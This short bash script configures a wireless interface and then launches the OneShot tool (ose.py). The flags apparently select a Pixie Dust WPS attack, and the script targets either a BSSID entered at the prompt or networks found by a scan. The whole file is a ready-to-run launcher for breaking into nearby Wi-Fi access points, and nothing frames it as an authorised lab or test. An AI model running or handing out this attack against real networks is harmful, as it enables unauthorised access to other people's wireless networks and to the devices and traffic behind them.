#!/bin/bash

sudo ifconfig ${INTERFACE} down
sudo iwconfig ${INTERFACE} mode managed # OneShot needs the adapter to be in managed
sudo ifconfig ${INTERFACE} up

read -p "bssid? (leave blank to scan for networks): " bssid

if [ -z "${bssid}" ]; then
	sudo python ../.scripts/ose/ose.py -i ${INTERFACE} -K -F -X -w
else
	sudo python ../.scripts/ose/ose.py -i ${INTERFACE} -K -F -X -w --bssid "${bssid}"
fi

